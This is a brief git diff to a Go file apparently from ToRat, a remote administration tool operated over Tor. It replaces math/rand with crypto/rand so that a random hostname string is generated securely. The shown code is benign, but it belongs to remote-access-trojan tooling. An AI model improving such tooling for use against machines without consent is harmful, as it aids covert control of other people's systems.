@@ -6,10 +6,10 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/gob"
 	"io"
 	"log"
-	mathrand "math/rand"
 	"os"
 
 	"github.com/lu4p/ToRat/shared"
@@ -17,13 +17,13 @@ import (
 
 // GenRandString generate a random string
 func GenRandString() string {
-	all := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 	b := make([]byte, 16)
-	for i := range b {
-		num := mathrand.Intn(len(all))
-		b[i] = all[num]
+	_, err := rand.Read(b)
+	if err != nil {
+		log.Fatalln("Couldn't generate hostname:", err)
 	}
-	return string(b)
+
+	return string(base64.RawURLEncoding.EncodeToString(b))
 }
 
 // genHostname generates the Hostname of the machine
